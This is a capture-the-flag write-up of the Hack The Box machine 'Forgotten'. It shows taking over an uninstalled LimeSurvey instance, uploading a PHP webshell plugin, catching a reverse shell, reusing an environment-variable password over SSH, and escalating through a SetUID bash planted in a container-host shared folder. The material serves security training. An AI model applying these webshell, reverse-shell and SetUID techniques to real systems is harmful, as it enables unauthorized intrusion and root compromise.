---
maquina: "Forgotten"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "16 Sep 2025"
retire: "16 Sep 2025"
creadores: "xct"
htb_url: "https://hackthebox.com/machines/forgotten"
app_url: "https://app.hackthebox.com/machines/733"
url: "https://0xdf.gitlab.io/2025/09/16/htb-forgotten.html"
tipo: "htb"
en_lista_oscp: true
oscp_seccion: "vulnlab"
---

Forgotten starts with an uninitialized instance of LimeSurvey. I’ll do the installation wizard, using a MySQL instance hosted on my VM as the database, and giving myself superadmin access. I’ll upload a malicious plugin to get RCE and a shell in the LimeSurvey container. I’ll find a password in an environment variable that works for the user account on the host, as well as sudo to get root in the container. I’ll abuse that to write a root-owned SetUID binary in a shared folder on the container such that I get access to it on the host and complete the compromise.

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ nmap -p- -vvv --min-rate 10000 10.129.171.142
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 15:31 UTC
...[snip]...
Nmap scan report for 10.129.171.142
Host is up, received reset ttl 63 (0.023s latency).
Scanned at 2025-09-16 15:31:32 UTC for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
           Raw packets sent: 65828 (2.896MB) | Rcvd: 65536 (2.621MB)
oxdf@hacky$ nmap -p 22,80 -sCV 10.129.171.142
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 15:31 UTC
Nmap scan report for 10.129.171.142
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
```

Based on the [OpenSSH version](https://0xdf.gitlab.io/cheatsheets/os#ubuntu), the host is likely running Ubuntu 22.04 jammy LTS (or maybe 22.10 kinetic). The [Apache version](https://0xdf.gitlab.io/cheatsheets/os#debian) shows Debian, which is difficult to nail down a version from. Still, it’s interesting that it’s different from the OS on SSH. `nmap` shows one additional hop to get to the webserver, which `lft` confirms:

```console
oxdf@hacky$ sudo lft 10.129.171.142:22
Tracing ...T
TTL LFT trace to 10.129.171.142:22/tcp
 1  10.10.14.1 21.1ms
 2  [target open] 10.129.171.142:22 21.6ms
oxdf@hacky$ sudo lft 10.129.171.142:80
Tracing ....T
TTL LFT trace to 10.129.171.142:80/tcp
 1  10.10.14.1 21.3ms
 2  10.129.171.142 21.9ms
 3  [target open] 10.129.171.142:80 21.8ms
```

All of this implies the web application is running in a Debian container on an Ubuntu 22.04 host.

The website seems to be returning 403 forbidden. That could be that it requires auth, or that there’s some kind of WAF detecting and blocking `nmap` typically by user-agent string.

### Website - TCP 80

#### Site

Visiting the site does return 403:

![image-20250916114257359](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916114257359.png)

#### Tech Stack

The HTTP response headers just show Apache (which is also in the 403 page):

```http
HTTP/1.1 403 Forbidden
Date: Tue, 16 Sep 2025 15:43:14 GMT
Server: Apache/2.4.56 (Debian)
Content-Length: 277
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
```

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```console
oxdf@hacky$ feroxbuster -u http://10.129.171.142

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.171.142
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      317c http://10.129.171.142/survey => http://10.129.171.142/survey/
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      325c http://10.129.171.142/survey/modules => http://10.129.171.142/survey/modules/
301      GET        9l       28w      321c http://10.129.171.142/survey/tmp => http://10.129.171.142/survey/tmp/
301      GET        9l       28w      323c http://10.129.171.142/survey/admin => http://10.129.171.142/survey/admin/
301      GET        9l       28w      324c http://10.129.171.142/survey/themes => http://10.129.171.142/survey/themes/
301      GET        9l       28w      325c http://10.129.171.142/survey/plugins => http://10.129.171.142/survey/plugins/
301      GET        9l       28w      324c http://10.129.171.142/survey/assets => http://10.129.171.142/survey/assets/
301      GET        9l       28w      324c http://10.129.171.142/survey/upload => http://10.129.171.142/survey/upload/
301      GET        9l       28w      331c http://10.129.171.142/survey/upload/themes => http://10.129.171.142/survey/upload/themes/
[#>------------------] - 5m     25307/300015  69m     found:9       errors:18593
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_171_142-1758037728.state ...
[#>------------------] - 5m     25422/300015  69m     found:9       errors:18708
[#####>--------------] - 5m      8290/30000   30/s    http://10.129.171.142/
[#>------------------] - 5m      2083/30000   7/s     http://10.129.171.142/survey/
[#>------------------] - 5m      1832/30000   7/s     http://10.129.171.142/survey/tmp/
[#>------------------] - 5m      1864/30000   7/s     http://10.129.171.142/survey/admin/
[#>------------------] - 5m      1866/30000   7/s     http://10.129.171.142/survey/themes/
[#>------------------] - 5m      1863/30000   7/s     http://10.129.171.142/survey/plugins/
[#>------------------] - 4m      1814/30000   7/s     http://10.129.171.142/survey/assets/
[#>------------------] - 5m      1851/30000   7/s     http://10.129.171.142/survey/modules/
[#>------------------] - 5m      1916/30000   7/s     http://10.129.171.142/survey/upload/
[#>------------------] - 4m      1799/30000   7/s     http://10.129.171.142/survey/upload/themes/
```

After a minute or so, it starts returning all errors, but that’s still enough to see there’s some kind of application (maybe a CMS) at `/survey`.

#### /survey

Visiting `/survey` returns a LimeSurvey installer page:

[![image-20250916115710365](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916115710365.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916115710365.png)

If I click “Start installation” and then click through the license, the “Pre-installation check” page has the version 6.3.7 at the top:

![image-20250916122936811](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916122936811.png)

Click for full image

## Shell as limesurvey in Docker

### Strategy

I don’t find any obvious vulnerabilities in this version of LimeSurvey. The main CVE I keep coming across is [CVE-2021-44967](https://nvd.nist.gov/vuln/detail/CVE-2021-44967#vulnCurrentDescriptionTitle). I talked a bit about this in my [Heal post](https://0xdf.gitlab.io/2025/05/17/htb-heal.html#find-plugin), but this really shouldn’t have been given a CVE ID (in my humble opinion). The super admin role can edit PHP code, which means that anyone with that role can get RCE. That is the intended behavior of the software. It’s also something I can abuse, if I can get that level of access.

This instance appears to be not installed, so if I can initialize it such a way that I get super admin access, then I can upload a module and get RCE just like in Heal.

### Database Setup

Step 4 is where I need to configure the database. I have no reason to think there’s a DB running on Forgotten, and even if there is, I don’t know the creds. Still I get to define where the DB lives:

[![image-20250916140621839](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916140621839.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916140621839.png)

I’ll use Docker to create a MySQL server:

```console
oxdf@hacky$ docker run --name limesurvey-mysql -e MYSQL_ROOT_PASSWORD=rootpass123 -e MYSQL_DATABASE=limesurvey -e MYSQL_USER=limeuser -e MYSQL_PASSWORD=limepassword -p 3306:3306 -d mysql:latest
Unable to find image 'mysql:latest' locally
latest: Pulling from library/mysql
500d7b2546c4: Pull complete
01859c60b4e2: Pull complete
87565b56b57e: Pull complete
9b2f3769f0be: Pull complete
7d70b564625b: Pull complete
1d289f7d1ed9: Pull complete
d210a5b69bfe: Pull complete
95f5cac1a9e9: Pull complete
98045e6cd572: Pull complete
1421f5b704d5: Pull complete
Digest: sha256:94254b456a6db9b56c83525a86bff4c7f1e52335f934cbed686fe1ce763116a0
Status: Downloaded newer image for mysql:latest
8d4bf088fe1c8b5ad600159526a7cc77ee044d30f521cb61064a9eb9f8772419
oxdf@hacky$ sudo netstat -tnlp | grep 3306
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      33408/docker-proxy
tcp6       0      0 :::3306                 :::*                    LISTEN      33414/docker-proxy
```

The username, password, and table name are arbitrary, as long as I use those same values in the LimeSurvey setup:

![image-20250916141252713](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916141252713.png)

On clicking next, it can see the database:

[![image-20250916141325252](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916141325252.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916141325252.png)

I’ll click “Populate database”. The next screen is the “Administrator settings”:

![image-20250916141427814](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916141427814.png)

Click for full image

I’ll update the password to something I know, and click “Next”. It installed:

![image-20250916141456074](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916141456074.png)

### Admin RCE

Clicking the “Administration” button leads to the admin login page:

![image-20250916141910929](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916141910929.png)

I’ll log in with the user I just created and it logs in:

![image-20250916142031074](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142031074.png)

I’ll follow the same steps as in [Heal](https://0xdf.gitlab.io/2025/05/17/htb-heal.html#limesurvey-rce), first creating a PHP webshell `0xdf.php`:

```php
<?php system($_REQUEST['cmd']); ?>
```

I’ll also grab the [example config file](https://gitlab.com/SondagesPro/SampleAndDemo/ExampleSettings/-/blob/master/config.xml?ref_type=heads) and save it as `config.xml`. This file contains metadata about the plugin (such as the name). I can customize it, but I’ll just leave it exactly as is, noting the name “ExampleSettings”. I’ll Zip those two files:

```console
oxdf@hacky$ zip 0xdf.zip 0xdf.php config.xml
  adding: 0xdf.php (stored 0%)
  adding: config.xml (deflated 53%)
```

Under Configuration there’s a Plugins option:

[![image-20250916142602160](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142602160.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142602160.png)

That screen shows the existing plugins, and also has an “Upload & install” option:

[![image-20250916142712319](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142712319.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142712319.png)

I’ll click that and give it `0xdf.zip`. The details from the default config show up:

[![image-20250916142751544](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142751544.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142751544.png)

I’ll click “Install”, and now it shows up as “ExampleSettings” (from the `config.xml`):

[![image-20250916142838471](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142838471.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916142838471.png)

As I found in [Heal](https://0xdf.gitlab.io/2025/05/17/htb-heal.html#limesurvey-rce), the path is now `/survey/upload/plugins/ExampleSettings/0xdf.php`:

![image-20250916143011306](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250916143011306.png)

### Shell

To get a shell, I’ll provide a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to the webshell just in Firefox (making sure to encode `&` as `%26`), and I get a connection at `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.171.142 38526
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$
```

I’ll do a shell upgrade using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$ reset\
reset: unknown terminal type unknown
Terminal type? screen
limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$
```

## Shell as limesvc on Forgotten

### Enumeration

#### Container

The hostname of 12 hex characters matches the default Docker name. There’s also a `.dockerenv` file at the system root:

```console
limesvc@efaa6f5097ed:/$ ls -a
.   .dockerenv  boot  etc   lib    media  opt   root  sbin  sys  usr
..  bin         dev   home  lib64  mnt    proc  run   srv   tmp  var
```

The IP address is 172.17.0.2, which is not what I was interacting with (so it must be forwarded from the host):

```console
limesvc@efaa6f5097ed:/$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 193028  bytes 21248170 (20.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 62814  bytes 18525854 (17.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

#### Web

The website is running from `/var/www/html/` according to `/etc/apache2/sites-enabled/000-default.conf` (comments removed):

```apache
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

There’s a `survey` directory as expected:

```console
limesvc@efaa6f5097ed:/var/www/html$ ls
survey
limesvc@efaa6f5097ed:/var/www/html$ ls survey/
LICENSE      application  index.php  node_modules      psalm-strict.xml  tmp
README.md    assets       installer  open-api-gen.php  psalm.xml         upload
SECURITY.md  docs         locale     plugins           setdebug.php      vendor
admin        gulpfile.js  modules    psalm-all.xml     themes
```

#### Users

There’s only one non-root user with a home directory in `/home`:

```console
limesvc@efaa6f5097ed:/home$ ls
limesvc
```

That matches the users with shells set in `passwd`:

```console
limesvc@efaa6f5097ed:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
limesvc:x:2000:2000::/home/limesvc:/bin/bash
```

`/home` is very empty:

```console
limesvc@efaa6f5097ed:/home$ find . -type f
./limesvc/.profile
./limesvc/.bashrc
./limesvc/.bash_logout
```

limesvc requires a password to run `sudo`:

```console
limesvc@efaa6f5097ed:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for limesvc:
```

I don’t have one.

Checking the environment variables, there is one for `LIMESURVEY_PASS`:

```console
limesvc@efaa6f5097ed:/$ env
HOSTNAME=efaa6f5097ed
PHP_VERSION=8.0.30
APACHE_CONFDIR=/etc/apache2
PHP_INI_DIR=/usr/local/etc/php
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_LDFLAGS=-Wl,-O1 -pie
PWD=/
APACHE_LOG_DIR=/var/log/apache2
LANG=C
LS_COLORS=
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make  pkg-config               re2c
LIMESURVEY_PASS=5W5HN4K4GCXf9E
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
LIMESURVEY_ADMIN=limesvc
APACHE_RUN_GROUP=limesvc
APACHE_LOCK_DIR=/var/lock/apache2
SHLVL=3
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
APACHE_RUN_DIR=/var/run/apache2
APACHE_ENVVARS=/etc/apache2/envvars
APACHE_RUN_USER=limesvc
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
_=/usr/bin/env
OLDPWD=/home
```

### SSH

This password actually does work for `sudo` here:

```console
limesvc@efaa6f5097ed:/$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for limesvc:
Matching Defaults entries for limesvc on efaa6f5097ed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
```

And I can get a shell as root:

```console
limesvc@efaa6f5097ed:/$ sudo -i
root@efaa6f5097ed:~#
```

But more interestingly, it works over SSH for the host:

```console
oxdf@hacky$ sshpass -p '5W5HN4K4GCXf9E' ssh limesvc@10.129.171.142
Warning: Permanently added '10.129.171.142' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
...[snip]...
limesvc@forgotten:~$
```

And I can grab `user.txt`:

```console
limesvc@forgotten:~$ cat user.txt
3ab41a7c************************
```

## Shell as root

### Enumeration

#### Users

There are two users with home directories in `/home`:

```console
limesvc@forgotten:/home$ ls
limesvc  ubuntu
```

limesvc can’t access `ubuntu`, and there’s nothing interesting in `limesvc`:

```console
limesvc@forgotten:/home$ find . -type f
./limesvc/.cache/motd.legal-displayed
./limesvc/.profile
./limesvc/.bashrc
./limesvc/.bash_logout
./limesvc/user.txt
find: ‘./ubuntu’: Permission denied
```

limesvc can’t run `sudo`:

```console
limesvc@forgotten:~$ sudo -l
[sudo] password for limesvc:
Sorry, user limesvc may not run sudo on localhost.
```

#### Filesystem

The `/opt` directory has `containerd` (typically associated with Docker) and a `limesurvey` directory:

```console
limesvc@forgotten:/$ ls opt/
containerd  limesurvey  limesurvey6.3.7+231127.zip
```

The `limesurvey` directory looks the same as the one on the container:

```console
limesvc@forgotten:/opt$ ls limesurvey
LICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload
README.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor
SECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp
```

From within the container, I’ll write a file to the web directory:

```console
limesvc@efaa6f5097ed:/var/www/html/survey$ echo "hello host!" > 0xdf
```

It’s visible on the host:

```console
limesvc@forgotten:/opt$ cat limesurvey/0xdf
hello host!
```

It’s owned by the same user:

```console
limesvc@forgotten:/opt$ ls -l limesurvey/0xdf
-rw-r--r-- 1 limesvc limesvc 12 Sep 17 00:49 limesurvey/0xdf
```

### Docker / Host Share Abuse

As the root user in the container, I’ll make a copy of Bash inside the shared web directory, and set it as SetUID / SetGID:

```console
root@efaa6f5097ed:~# rm /var/www/html/survey/0xdf
root@efaa6f5097ed:~# cp /bin/bash /var/www/html/survey/0xdf
root@efaa6f5097ed:~# chmod 6777 /var/www/html/survey/0xdf
root@efaa6f5097ed:~# ls -l /var/www/html/survey/0xdf
-rwsrwsrwx 1 root root 1234376 Sep 17 00:51 /var/www/html/survey/0xdf
```

From the host, it’s there, and with the same permissions:

```console
limesvc@forgotten:/opt$ ls -l limesurvey/0xdf
-rwsrwsrwx 1 root root 1234376 Sep 17 00:51 limesurvey/0xdf
```

I’ll run with `-p` to not drop privs and get a root shell:

```console
limesvc@forgotten:/opt$ limesurvey/0xdf -p
0xdf-5.1#
```

And grab `root.txt`:

```console
0xdf-5.1# cat /root/root.txt
0c628afe************************
```
